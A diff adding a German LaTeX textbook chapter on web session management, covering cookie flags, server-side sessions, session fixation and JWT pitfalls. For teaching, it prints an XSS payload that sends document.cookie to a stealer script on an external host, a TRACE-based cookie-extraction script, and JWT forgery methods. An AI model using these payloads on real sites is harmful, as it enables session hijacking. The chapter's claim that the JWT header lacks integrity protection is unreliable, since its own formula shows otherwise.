@@ -1,0 +1,273 @@
+\chapter{Session Management}
+
+Eine Session ist eine stehende Verbindung zwischen einem Client und einem Server. Innerhalb der Session kann der Server Zugriffe einem Client zuordnen. Nach erfolgtem Login kennt der Server also die Benutzeridentität des Clients (bis zum erfolgten Logout). Im Web-Umfeld werden zumeist Cookie-basierte Sessions verwendet, andere Möglichkeiten wären z. B. Token basierte Systeme.
+
+Token-basierte Systeme werden gerne zur Übertragung von Zugangsberechtigungen für REST/SOAP-Webservices verwendet. Sofern die Services state-less sind, ist dies eine sehr gute Kombination. In diesem Fall werden alle notwendigen Session-/Benutzerinformationen im Token transportiert, der Service selbst persistiert keine State-Informationen. Durch diese funktionale Herangehensweise kann der Service perfekt horizontal skalieren: wird mehr Performance benötigt, werden weitere Service-Worker gestartet. Dies ist häufig bei Webservices die durch Mobilapplikationen konsumiert werden der Fall, allerdings seltener bei interaktiven Webapplikationen. Bei letzteren wird der Token häufig als Session-Identifikatior missbraucht und dient zur Identifikation einer serverseitigen Session --- der Service ist also state-ful. Um ein vollwertiges Session-System zu erlangen müssen Programmierer nun dieses, basiertend auf dem Token als Identifier, selbst programmieren und erfinden daher quasi das Rad neu. Die Verwendung von Token erbringt keine Vorteile mehr und sollte in diesem Fall diskutiert werden. Ein häufiger Grund diesen Nachteil in Kauf zu nehmen ist, dass zumindest Web- und Mobilapplikationen die idente serverseitige API konsumieren können.
+
+\section{Cookies}
+
+Ein Cookie ist ein kleines Datenpaket welches im Zuge des Session-Managements vom Server dem Client mitgeteilt wird. Der Client speichert nun dieses Cookie und inkludiert es in jedem Folgeaufruf von Operationen auf dem setzenden Webserver. Ein Cookie besteht aus einem Namen, Wert, Ablaufdatum und einem Gültigkeitsbereich (Domain und/oder Pfad).
+
+Wird eine Domain für ein Cookie gesetzt, wird das Cookie für diese Domain und alle Subdomains übertragen. Dies ist überraschend unsicherer als keine Domain zu setzen: in diesem Fall würde das Cookie nur an die idente Domain (nicht an die Subdomains) übertagen werden.
+
+Eine wichtige Cookie-Option ist das Setzen eines Gültigkeitspfades. Wird dieser gesetzt, dann wird das Cookie nur für Ressourcen übertragen, deren Pfad ``unter'' diesem Pfad liegen. Auf diese Wiese können mehrere Applikationen auf unterschiedlichen Pfaden auf einem Webserver betrieben werden während keine Applikation auf die Cookies einer anderen Applikation zugreifen kann.
+
+Zusätzlich zu den Cookie-Einstellungen gibt es spezielle sicherheitsrelevante Cookie-Flags:
+
+\subsection{secure-Flag}
+
+Durch das \textit{secure}-Flag wird die Übertragung des Cookies mittels HTTPS erzwungen. Bei potentiell auftretenden HTTP-Zugriffen wird kein Cookie übermittelt, der Request allerdings abgesendet. Dies erlaubt es dem Webserver auf sichere Weise ein HTTP 300 Redirect von HTTP auf HTTPS durchführen.
+
+\subsection{httpOnly-Flag}
+
+Das \textit{httpOnly}-Flag verbietet es Webbrowsern den Zugriff mittels Javascript auf das Cookie. Falls das Cookie nur zur Bildung der Benutzersession verwendet wird, kann dieses Flag durch den Webserver gesetzt, und damit Javascript-basierte Identity Theft Angriffe stark erschwert werden. Achtung: dieses Flag besitzt keinen Einfluss auf die Verwendung des HTTP- oder HTTPS-Protokolls.
+
+Problematisch ist in diesem Zusammenhang die HTTP TRACE Methode. Diese dient zu Analysezwecken und kopiert den eingehenden Request als Content in das Antwortdokument. Falls der Angreifer nicht mittels Javascript auf das Session-Cookie zugreifen kann, aber die Möglichkeit besitzt per Javascript einen HTTP TRACE Aufruf auf den Opfer-Webserver abzusetzen, kann er auf diese Weise das Session-Cookie extrahieren:
+
+\begin{minted}{html}
+<script>
+  var xmlhttp = new XMLHttpRequest();
+  var url = 'http://127.0.0.1/';
+
+  xmlhttp.withCredentials = true; // send cookie header
+  xmlhttp.open('TRACE', url, false);
+  xmlhttp.send();
+</script>
+\end{minted}
+
+Aus diesem Grund wird empfohlen, auf Webservern immer HTTP TRACE zu deaktivieren.
+
+\subsection{sameSite-Flag}
+
+Das \textit{sameSite}-Flag dient zur Vermeidung von CSRF-Angriffen. Das Flag unterrichtet den Browser, wann ein Session-Cookie an eine Webseite übertragen werden soll und wann nicht.
+
+Bei Verwendung von \textit{strict} wird niemals ein Session-Cookie im cross-domain Kontext übertragen. Dies bedeutet, dass das Cookie nur übertragen wird, wenn der Benutzer von der Webseite auf einen Link/eine Operation auf der identen Webseite navigiert. Wird z. B. ein Link auf die Webseite von einer externen Quelle angeklickt (z. B. innerhalb eines Forums oder ein Link innerhalb einer Email), wird bei dem URL-Aufruf kein Cookie übergeben. Hier muss beachtet werden, dass falls die Webseite eine \textit{Unvalidated Forward or Redirect}-Lücke besitzt, der Angreifer diese ansteuern kann und bei dem durchgeführten zweiten Aufruf der Browser das Cookie inkludiert und dadurch potentiell bösartige Aktionen ausgeführt werden können.
+
+Bei Verwendung von \textit{lax} darf der Browser bei dem cross-site Zugriff auf die Webseite das Cookie übertragen, dies aber nur wenn eine sichere HTTP Methode (nicht daten-verändernd) verwendet wird und das Ziel eine \textit{top-level navigation} ist (sprich die Webseite aufgerufen wird und nicht eine Operation innerhalb der Webseite).
+
+\subsection{Beispiel für Cookies}
+
+Ein einfaches Cookie-Beispiel bei dem das Cookie \textit{sessionid} gesetzt wird. Der Zugriff mittels JavaScript wurde durch \textit{httpOnly} verboten, das Cookie ist für alle Pfade gültig. Da kein Ablaufdatum (\textit{Expires}) bzw. Lebenszeit (\textit{Max-Age}) angegeben wurde, wird das Cookie beim Schließen des Browsers gelöscht:
+
+\begin{minted}{text}
+Set-Cookie: sessionid=38afes7a8; HttpOnly; Path=/
+\end{minted}
+
+Das folgende Cookies mit Namen \textit{id} wird vor der unsicheren Übertragung mittels HTTP (\textit{Secure}) als auch vor Zugriffen mittels JavaScript (\textit{httpOnly}) geschützt. Die Lebensdauer wurde mit einem absoluten Datum angegeben:
+
+\begin{minted}{text}
+Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
+\end{minted}
+
+Ein Beispiel für das Setzen der sicherheitsrelevanten Header:
+
+\begin{minted}{text}
+Set-Cookie: CookieName=CookieValue; SameSite=Strict; httpOnly; Secure;
+\end{minted}
+
+\section{Client- vs Server-Side Session}
+
+Mit Hilfe des Cookies kann der Server nun ein Session-Management Schema implementieren. Prinzipiell gibt es nun die Unterscheidung in client- und server-seitigem Session-Schemas.
+
+Bei der client-seitigen Variante speichert der Server alle Authentication-Relevanten Daten direkt im Cookie und versendet dieses an den Client. Am Server selbst wird keine Session-Information gespeichert. Bei jedem Folgezugriff inkludiert der Client dieses Cookie, der Server interpretiert diese Daten und bildet anhand dieser die Benutzersession. Bei diesem Verfahren sind mehrere Punkte problematisch:
+
+\begin{itemize}
+		\item Der Client kann das Cookie beliebig verändern. Dadurch könnte z. B. ein im Cookie gespeicherter Benutzername auf ``admin'' geändert werden. Der Server kann dies umgehen, indem er das Cookie signiert und dadurch dessen Integrität sichert.
+	\item Der Client kann das Cookie auslesen, und dadurch Zugriff auf potentiell sensible Daten erhalten. Der Server kann dies umgehen, indem er das Cookie verschlüsselt und dadurch die Confidentiality der Daten gewährleistet.
+	\item Der Server besitzt keine Möglichkeit serverseitig alle Sessions eines Benutzers zu invalidieren (sprich, alle Session eines Benutzers auszuloggen).
+\end{itemize}
+
+Bei einer server-seitigen Sessionimplementierung generiert der Server eine eindeutige zufällige ID und speichert diese innerhalb des Cookies. In einer serverseitigen Datenbank wird nun diese ID dem eingeloggten Benutzer zugeordnet und potentiell noch weitere Metainformationen (Zeitpunkt des Logins, IP-Adresse, etc.) gespeichert. Bei dieser Lösung werden die im Client gespeicherten Daten minimiert und der Server besitzt die Möglichkeit alle Sessions zu beenden (indem er die Einträge des Users aus der Session-Tabelle löscht).
+
+Aus Sicherheitssicht sind server-seitige Sessions zu bevorzugen; einige neuere Standards wie die österreichische ÖNORM A77.00 schreiben den Einsatz von server-seitigen Sessions vor.
+
+Teilweise wurden früher Session auch an Metadaten (IP-Adresse des Clients) gebunden. Aufgrund des Einsatzes von VPNs, WLANs, Mobiltelefonen und -internet wird dies mittlerweile seltener verwendet.
+
+\subsection{Token-basierte Systeme für interaktive Sessions}
+
+Häufig werden client-seitige Token Systeme als direkte Alternative zu klassichen Cookie-Session-basierten Systemen angepriesen. Als Vorteil wird zumeist ihre bessere Skalierbarkeit (wenn nur Token-gespeicherte Daten für eine Operation benötigt werden, wird kein Datenbank-Zugriff benötigt) und Sicherheit (durch die Verwendung von Kryptographie) angepriesen. Diese Begründung macht leider zumeist nur begrenzt viel Sinn.
+
+Bei den meisten Operationen, bei denen eine Authorisation überprüft wird, benötigen eine Form des Datenbankzugriffs da zusätzliche Daten zu den, im Token gespeicherten, Daten benötigt werden. Dadurch wird der Skalierbarkeits-Gedanke entkräftigt. Zusätzlich ist bei jedem Zugriff eine, potentiell teure, kryptographische Operation notwendig. Die Verwendung von Kryptographie innerhalb des Tokens ist orthogonal zu der Gesamtsicherheit der Webapplikation. Eine Cookie-basierte client-seitige Lösung kann ebenso eine Signatur (bzw. einen MAC) verwenden um die Integrität der Daten zu gewährleisten. Eine server-seitige Cookie-basierte Sessionlösung würde diese Überprüfung nicht benötigen, dafür allerdings einen kryptographischen Zufallszahlengenerator verwenden.
+
+Negativ für die Sicherheit ist das Fehlen einer server-seitigen Session-Komponente. Wie kann eine kompromittierte Session server-seitig invalidiert werden? Die naiive Lösung, den prviaten server-seitigen Schlüssel, der zur Erstellung des MACs/der Signatur des Tokens verwendet wird, zu tauschen ist nicht praktikabel, da dadurch alle aktiven Sessions ungültig werden würden. Wird eine server-seitige Blacklist geführt, wird aus dem Token auf einer logischen Ebene eine server-seitige Session: der Entwickler hat nun das Rad neu erfunden und dabei wahrscheinlich neue Bugs eingebaut.
+
+Wird eine Kombination von kurzlebigen Access-, und langlebigen Refresh-Tokens verwendet, wird dadurch das verwundbare Zeitfenster nur reduziert und eni Angreifer muss nur das Refresh- statt dem Access-Token entwenden um den selben Effekt zu erreichen. Wird beim Neuausstellen des Access-Tokens mittels des Refresh-Tokens das Token gegen eine Blacklist verglichen, hat der Entwickler wieder quasi server-seitige Sessions neu erfunden.
+
+Token-basierte Systeme sind IMHO gut dafür geeignet, Clients im Auftrag des Users Zugriff auf Operationen und Daten zu erlauben. Dies kann z. B. eine third-party Webseite oder eine Mobilapplikation sein. Für interaktive Webseiten sind sie potentiell suboptimal da sich die Entwickler Gedanken um die Revocation ausgestellter Tokens machen müssen. Synergie-Gründe (die gleiche API kann von einer Webapplikation als auch von mobilen Applikation verwendet werden) können eine Token-basierte Lösung interessant machen, in diesem Fall müssen allerdings die Vor- und Nachteile der selbst-implementierten Revocation abgewogen werden.
+
+\section{ViewState}
+
+Das ViewState-pattern speichert den aktuellen Status der View (z. B. eingegebene Daten, Verlaufshistorie, aktuell verfügbare Operationen) innerhalb des ViewStates, z. B. als hidden Parameter innerhalb jedes Formulars. Da der ViewState am Client gespeichert wird, muss der Server sich um den Integritäts- und Confidentiality-Schutz kümmern.
+
+Bei jeder Operation wird der ViewState vom Browser dem Server übergeben. Dieser überprüft die Integrität des ViewStates, verifiziert dass der ViewState mit der gewünschten Operation kompatibel ist, führt danach die Operation aus und aktualisiert den ViewState. Dieser wird dann innerhalb der nächsten Formulare wieder als hidden field eingetragen.
+
+
+\section{Idealer Sessionablauf}
+
+Der Soll-Session-Lifecycle wäre:
+
+\begin{enumerate}
+	\item Benutzer führt ein Login durch. Während des erfolgreichem Logins wird eine neue zufällige Session-Id am Server mittels eines kryptographisch-sicheren Zufallsgenerator generiert, und dem Client auf sicherem Weg mitgeteilt.
+	\item Der eingeloggte Benutzer führt nun mehrere Operationen aus. Der Browser des Benutzers inkludiert das Session-Cookie bei jedem Zugriff.
+	\item Vor dem Zugriff auf sensible Operationen oder Daten wird überprüft, ob die Session-Id noch aktiv ist. Der logische Benutzer wird der Session zugeordnet und die Applikation führt Überprüfung der Benutzeridentität und -berechtigung durch.
+	\item Während des Logouts wird sowohl server-seitig als auch client-seitig das Session-Cookie gelöscht und damit die Session auf beiden Seiten invalidiert.
+\end{enumerate}
+
+\section{Potentielle Probleme beim Session-Management}
+
+Während der idealle Sessionverlauf relativ einfach aussieht, können dabei mehrere sicherheitsrelevante Probleme auftreten:
+
+\subsection{Session-ID wird verloren}
+
+Die Session-ID dient als Erkennungsmerkmal eines Benutzers. Wenn ein Angreifer die Session-ID erlangt, kann er die Identität des Benutzers am Server übernehmen.
+
+Am einfachsten gelingt dies, wenn der Server nicht HTTPS verwendet. In diesem Fall benötigt der Angreifer nur Zugriff auf die Transportdaten (z. B. mittels Sniffing im gleichen WLAN ohne Client-Separation). Der Angreifer kann nun seine Session-Id mit der des Opfers ersetzen und übernimmt auf diese Weise dessen Identität.
+
+Aus diesem Grund sollten Webseiten nur mehr mittels HTTPS angeboten werden und auch automatisch HTTP Aufrufe auf HTTPS umleiten. Da zumeist Webseiten sowohl über HTTP und HTTPS angeboten werden, kann es zu Problemen kommen: z. B. könnte ein unbedarfter Benutzer eine HTTP Adresse in einem Browser eingeben. In diesem Fall übermittelt der Browser automatisch bei diesem ungesicherten Request das Session-Cookie. Während er danach automatisch vom Server auf HTTPS umgeleitet wird, ist dies bereits zu spät da bei dem ersten ungesicherten Request schon das Cookie dislcosed wurde.
+
+Eine Lösung für dieses Problem bietet das secure-Flag das bei einem Cookie gesetzt werden kann. Dieses Flag unterrichtet den Webbrowser, dass das Cookie nur mittels HTTPS übertragen werden darf. Im Fall einer HTTP Operation wird die Operation durch den Browser ohne Cookie durchgeführt.  Die Verbindungssicherheit kann ebenso durch die Verwendung des HSTS-Headers bzw. durch Einstz bestimmer CSP-Direktiven sichergestellt werden.
+
+\subsection{Mixed-Content / FireSheep}
+
+Die Verwendung von sowohl HTTP als auch HTTPS innerhalb einer Seite ist ebenso problematisch. Dieses Pattern war um das Jahr 2010/11 stark verbreitet, u.a. von Seiten wie Facebook, Twitter und Flickr. In diesem Fall war nur die Login und Logout Operation mittels HTTPS geschützt, weitere Inhalte wurde mittels HTTP übertragen. Die Begründung war, dass sensible Daten (Benutzername und Passwort) verschlüsselt werden und keine sensiblen Daten in den übertragenen Seiten enthalten sind\footnote{Ja, es war eine einfachere Zeit. Mittlerweile würde der Inhalt eines Facebook-Kontos auch als kritisch eingeschätzt werden.}. Hauptgrund dafür war gering verfügbare Rechenkapazität und die relativ "teure" Verschlüsselung (also schlussendlich Kosten).
+
+Dies ist natürlich problematisch, da ein Angreifer mit Zugriff auf die Netzwerkdaten die Session-Id extrahieren und dadurch die serverseitige Identität übernehmen kann. Dies wurde eindrucksvoll mittels FireSheep gezeigt: diese Firefox-Erweiterung zeigte in einer SideBar alle erkannten Sessions an, der Anwender konnte durch Click auf die Sidebar die jeweilige Session im Browser aktivieren. Aufgrund der Publicity dieses Tools fingen Seiten schnell an, HTTPS durchgängig zu implementieren. Eine weitere Firefox Erweiterung die in Reaktion darauf erschien war HTTP Everywhere (erzwingt den Einsatz von HTTPS wenn eine Seite sowohl über HTTP und HTTPS verfügbar ist).
+
+
+\subsection{Session-ID in GET-Parameter}
+
+Sensible Daten sollten niemals als Teil der URL bzw. über HTTP GET Parameter übertragen werden. Dies gilt auch für die Session-Id.
+
+Welche Probleme können bei der Verwendung als GET Parameter auftreten?
+
+\begin{itemize}
+	\item Die Session-Id ist Teil der URL und wird mit hoher Wahrscheinlichkeit in Web-Proxies und Web-Server Logdateien gespeichert.
+	\item Die URL inklusive der GET Parameter sind Teil der Browser Historie. Durch Fehler in Browsern können Fremdseiten teilweise auf die Browserhistorie zugreifen.
+	\item GET Parameter werden teilweise von Site Analysis Tools verwendet. Dies würde implizieren, dass z. b. bei Verwendung von Google Analytics alle Session-IDs an Alphabet weitergeleitet werden.
+	\item Wird ein Cookie als Teil der URL verwendet, wird dieser Session-Wert im Normalfall über den Referer-Header übertragen. Auf diese Weise würde jede besuchte externe Webseite diesen Session-Wert.
+\end{itemize}
+
+Anstatt des GET-Parameters sollte die Cookie-basierte HTTP Session verwendet werden. Falls dies nicht möglich ist, sollte ein HTTP POST statt GET verwendet werden. Während dies die Gefährdung durch einen bösartigen Angreifer nicht minimiert, verringert es das Fehlerrisiko.
+
+\subsection{Session-ID ist vorherbestimmbar}
+
+Eine Session-Id sollte immer eine zufällig generierte Zahl sein, dies impliziert die Verwendung eines kryptographischen Zufallszahlengenerators. Beispiele für schlecht gewählte Session-Ids:
+
+\begin{itemize}
+	\item Aufsteigende Zahlen
+	\item Verwenden eines Hashs über erratbare Eingangswerte: \textit{hash(Systemzeit)}, \textit{hash(username)}, \textit{hash(username:password)}.
+	\item Verwenden eines MACs über konstante Daten: \textit{mac(username)}, \textit{mac(username:password)}
+	\item mac(systemzeit) --- mittels NTP Angriffe kann versucht werden, die Zeit des Servers in die Vergangenheit zu bewegen.
+	\item Verwendung eines nicht-kryptographisch sicheren Zufallszahlengenerator (z. B. \textit{java.util.Random} statt \textit{java.security.SecureRandom} in Java).
+\end{itemize}
+
+Während eines Pen-Tests würde die Zufälligkeit der Session-Id getestet werden. Dies geschieht indem man sich mehrere Tausend Male einloggt und mittels statistischer Methoden die Zufälligkeit und Entropie der Session-Id analysiert.
+
+\subsection{Session Fixation}
+
+Ein weiteres Problem besteht, wenn der Angreifer eine Session-Id dem Clientbrowser vorschreiben kann bzw. eine konstante Session-Id bekannt ist.
+
+Letzteres passiert, wenn die Webapplikation beim ersten Zugriff eines Browsers eine Session-Id vergibt und diese während des Logins nicht neu setzt. Im einfachsten Fall würde ein Angreifer kurz Zugriff auf den Browser des Opfers erhalten (z. B. durch einen nicht gesperrten PC innerhalb eines Büros), die Zielwebseite besuchen und den Wert des Session Cookies aufzeichnen. Wenn sich nun (Stunden später) das Opfer einloggt, kennt der Angreifer bereits den Wert des Session-Cookies und kann auf diese Weise die Session übernehmen.
+
+Alternativ: unter der Annahme, dass die Webseite zusätzlich eine Operation besitzt bei der das Session-Cookie mittels HTTP GET Parameter übergeben wird. In dem Fall kann der Angreifer einen Social Engineering Angriff durchführen. Er verschickt Emails mit Links auf die betreffende Operation mit zufällig generierten Session-Ids. Wenn ein Opfer nun auf diese Operation zugreift, erkennt der Webserver, dass das Opfer nicht eingeloggt ist und leitet das Opfer zum Login-Dialog. Das Opfer logt sich ein, der Webserver übernimmt die Session-Id. Der Angreifer muss nur periodisch testen, ob mit einer der versendeten Session-Ids ein Login möglich ist.
+
+\subsection{Session-Extraktion mittels einer XSS-Lücke}
+
+Mittels Javascript kann auf Session-Cookies zugegriffen werden. Falls die Webseite eine (der häufigen) XSS-Lücken besitzt kann ein Angreifer nun Javascript-Code auf der Webseite platzieren, warten bis ein anderer Benutzer darauf zugreift und mittels des Javascript-Codes die Session-Id auf einen externen Server übermitteln. Dieser Angriffsvektor macht vor allem Spass, wenn eine Nachrichtenfunktion innerhalb einer Applikation verwundbar ist, da man dadurch einzelne Benutzer direkt anvisieren kann.
+
+Beispiel für ein einfaches Javascript-Fragment welches ein Redirect auf einen externen Server (xyz.com) durchführt und als GET-Parameter die aktuellen Cookies übergibt:
+
+\begin{minted}{html}
+<script>location.href = 'http://xyz.com/stealer.php?cookie='+document.cookie;
+</script>
+\end{minted}
+
+Folgende Gegenmaßnahmen sollten implementiert werden:
+
+\begin{itemize}
+	\item keine XSS-Lücke in der Webseite implementieren\ldots
+	\item durch Verwendung des httpOnly-Cookie Flags kann dem Webbrowser mitgeteilt werden, dass der Zugriff mittels Javascript auf das Session Cookie nicht erlaubt ist.
+	\item CSP bietet Möglichkeiten XSS-Angriffe einzuschränken.
+\end{itemize}
+
+\section{JSON Web Tokens}
+
+JSON Web Tokens (JWT) sind standardisierte (RFC 7519) Tokens die als HTTP Parameter, HTTP Session Cookies oder mittels eines HTTP Headers übertragen werden können. Ein JSON Web-Token besteht aus drei Bereichen:
+
+\begin{itemize}
+	\item Header: dieser Bereich speichert vor allem den verwendeten Algorithmus zur Erstellung des Integrity Checks.
+	\item Content: JSON-Dokument welches die eigentliche Payload des Tokens ist. Es gib hier mehre vordefinierte optionale Werte: \textit{iss} beschreibt den Issuer/Aussteller des Tokens, \textit{sub} beschreibt das Subjekt des tokens, \textit{aud} die geplante Audience (welche Server sollen das Token erhalten, \textit{exp} und \textit{nbf} den Gültigkeitszeitraum des tokens, \textit{iat} den Ausstellungszeitpunkt.
+	\item Integrity Check: der integrity check verwendet den, im \textit{alg}-Header definierten Algorithmus über \textit{header} und \textit{content} um eine Checksumme zu bilden.
+\end{itemize}
+
+Die Gesamtstruktur des Tokens ist:
+
+\begin{minted}{text}
+verification = algorithm(base64(header) + "." + base64(content))
+token = base64(header) + "." + base64(content) + "." + base64(hash)
+\end{minted}
+
+Ein Beispiel für einen Token (man kann dabei die drei durch einen . getrennten Base64-Bereiche erkennen. Da es sich um encoded JSON handelt, beginnen die beiden ersten Base64-Blöcke immer mit \textit{eyJ}):
+
+\begin{minted}{text}
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
+\end{minted}
+
+\subsection{Problem: Null-Algorithmus}
+
+Ein grundlegendes Problem bei JWT ist, dass die Checksumme nur über den \textit{content} Bereich berechnet wird. Der gesamte \textit{header} Bereich wird nicht integritätsgeschützt. Dies erlaubt es einem Angreifer, die in dem Header vorhandenen Metadaten beliebig zu verändern.
+
+Ein einfacher Angriff gegenüber JWT das Setzen des \textit{alg} Parameters innerhalb des Headers auf den \textit{NULL}-Algorithmus. Dies bedeutet, dass keine Checksumme berechnet, und der dritte Part des JWTs einfach leer bleibt. Dadurch kann der Angreifer den content nun beliebig wählen und verletzt dabei trotzdem keine Integritätsregeln.
+
+\subsection{Probleme bei MAC-basierter Verifizierung}
+
+Wenn ein Angreifer einen ausgestellten JWT empfängt (weil er z. B. ein Benutzer einer Webapplikation ist) besitzt er die Möglichkeit, einen Offline-Brute Force Angriff gegen den Token durchzuführen. Der Angreifer besitzt die Eingangsdaten für den MAC (die Base64-codierten \textit{header} und \textit{content} Bereiche des Tokens) und kann nun mittels eines Brute-Force Angriffs versuchen, den Schlüssel des MACs zu erraten.
+
+Aus diesem Grund muss bei Einsatz eines MACs immer ein sehr sicherer Schlüssel gewählt werden.
+
+\subsection{Problem: MAC vs. Signature}
+
+Ein weiteres Problem tritt bei einer Confusion betreffend dem verwendeten Verfahren zur Berechnung der Prüfsumme (dritter Bereich des Tokens) auf. Hier gibt es die Möglichkeit, dass ein Public-Key basiertes Verfahren zur Erstellung einer Signatur oder ein shared-key basiertes Verfahren zur Erstellung eines MACs verwendet wird.
+
+Die Methode zur Verifikation eines Tokens wird folgend aufgerufen:
+
+\begin{minted}{ruby}
+	validate(token, key)
+\end{minted}
+
+Als erster Parameter wird das zu verifizierende Token übergeben, als zweiter Parameter wird der zu verwendende Key übergeben. Bei einem Signature-basierten Verfahren würde hier der public-key übergeben (da die Signatur ja mittels des public-Keys verifiziert wird), bei einem MAC-basierten Verfahren wird hier der shared private key übergeben (der für die Berechnung des MACs benötigt wird). Die Selektion des Verfahrens geschieht über den \textit{alg} Parameter im Header des Tokens. Wird ein Signatur-basiertes Verfahren gewählt, ist der Public-Key fast immer öffentlich verfügbar.
+
+Ein Problem tritt nun auf, wenn der Entwickler eines Services davon ausgeht, dass der Client immer ein Signatur-basiertes Verfahren verwenden wird. In dem Fall würde eine naive Implementierung folgenden Code wählen:
+
+\begin{minted}{ruby}
+	# assume that token is an signature-based token
+	validate(token, public-key)
+\end{minted}
+
+Es wird also der public key verwendet um die Signatur zu überprüfen.
+
+Ein Angreifer kann nun den public key herunterladen und selbst ein neues Token erstellen. Bei diesem setzt er den \textit{alg} Wert auf \textit{MAC}, generiert also ein MAC-basiertes Token. Als geheimen Schlüssel für dieses Token verwendet er den public key der für die Überprüfung der Signatur verwendet wird. Wenn er nun dieses Token an den Service übergibt wird folgendes Code-Fragment aufgerufen:
+
+\begin{minted}{ruby}
+	# token ist ein MAC-basiertes token
+	# die validate Funktion wird deswegen versuchen
+	# einen MAC zu berechnen und verwendet dafuer
+	# den zweiten Parameter (public-key)
+	validate(token, public-key)
+\end{minted}
+
+Da der Server (hardcoded) annimmt, dass eine Signatur überprüft wird, wird der public key (den der Angreifer zum Erstellen des MACs verwendet hat) als Schlüssel übergeben. Die validate Funktion liest nun das Token, erkennt, dass dieses MAC-basiert ist und verwendet nun den übergebenen Schlüssel um einen MAC zu berechnen. Dieser ist nun ident zu dem MAC den der Angreifer gespeichert hat und die Operation wird aufgerufen, obwohl der Angreifer darauf keinen Zugriff erhalten sollte.
+
+Dieses Problem zeigt, dass der Entwickler des Webservices immer sicherstellen muss, dass das Token den erwarteten Algorithmus (in diesem Fall einen Signatur-basierten Algorithmus) verwendet. Falls das Token hier einen anderen Algorithmus verwendet hat, muss das Token verworfen werden.
+
+
+\section{Reflektionsfragen}
+
+\begin{enumerate}
+	\item Was versteht man unter einem Session-Fixation Angriff?
+	\item Erkläre client- und server-seitige Session-Konzepte. Welche Variante sollte man aus Sicherheitsgründen wählen und erläutere dies.
+	\item Wie sieht ein guter Umgang mit einer Session aus? Wann wird diese angelegt, wann gelöscht. Wie sollte sie implementiert werden?
+	\item Welche Session-Cookie Flags sollten aus Sicherheitsgründen gesetzt werden, erläutere welche Angriffe dadurch unterbunden werden (mindestens drei)?
+	\item Welche sicherheits-relevenaten Probleme gibt es im Zusammenhang von Mixed-Content und Session-IDs?
+	\item Warum sollten Session-ID nie innerhalb der URL (bzw. als HTTP GET-Parameter) verwendet werden?
+\end{enumerate}
